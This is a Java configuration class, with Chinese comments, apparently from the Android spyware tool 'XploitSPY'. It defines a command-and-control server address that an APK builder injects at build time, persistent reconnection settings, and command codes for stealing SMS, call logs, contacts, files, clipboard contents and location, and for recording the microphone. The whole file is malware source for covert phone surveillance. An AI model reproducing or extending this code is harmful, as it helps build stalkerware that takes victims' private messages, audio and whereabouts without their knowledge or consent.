package com.remote.app;

/**
 * 应用全局配置类
 * 包含 C2 服务器地址、连接参数等
 */
public class Config {
    
    /**
     * C2 服务器地址 - 在编译时由 APK Builder 注入
     * 默认值在开发时使用，生产环境由服务端 apkBuilder.js 替换
     */
    public static String C2_SERVER = "http://127.0.0.1:80";
    
    /**
     * Socket.IO 重连参数
     */
    public static final int RECONNECTION_DELAY = 5000;      // 5秒
    public static final int RECONNECTION_DELAY_MAX = 999999999; // 理论无限制
    
    /**
     * 日志标签
     */
    public static final String LOG_TAG = "XploitSPY";
    
    /**
     * 消息类型常量 (与服务端对应)
     */
    public static class MessageType {
        public static final String PING = "ping";
        public static final String PONG = "pong";
        public static final String ORDER = "order";
        
        // 命令类型
        public static final String FILE_MANAGER = "0xFI";      // 文件管理
        public static final String SMS_MANAGER = "0xSM";       // 短信管理
        public static final String CALL_LOG = "0xCL";          // 通话记录
        public static final String CONTACTS = "0xCO";          // 通讯录
        public static final String MIC_RECORD = "0xMI";        // 麦克风录音
        public static final String LOCATION = "0xLO";          // 定位
        public static final String WIFI_SCAN = "0xWI";         // WiFi 扫描
        public static final String PERMISSION = "0xPM";        // 权限检查
        public static final String APP_LIST = "0xIN";          // 应用列表
        public static final String GET_PERMISSION = "0xGP";    // 获取单个权限状态
        public static final String CLIPBOARD = "0xCB";         // 剪贴板监听
    }
    
    /**
     * 检查 C2 服务器地址是否设置
     */
    public static boolean isC2ServerConfigured() {
        return C2_SERVER != null && !C2_SERVER.isEmpty() && !C2_SERVER.equals("http://127.0.0.1:80");
    }
}
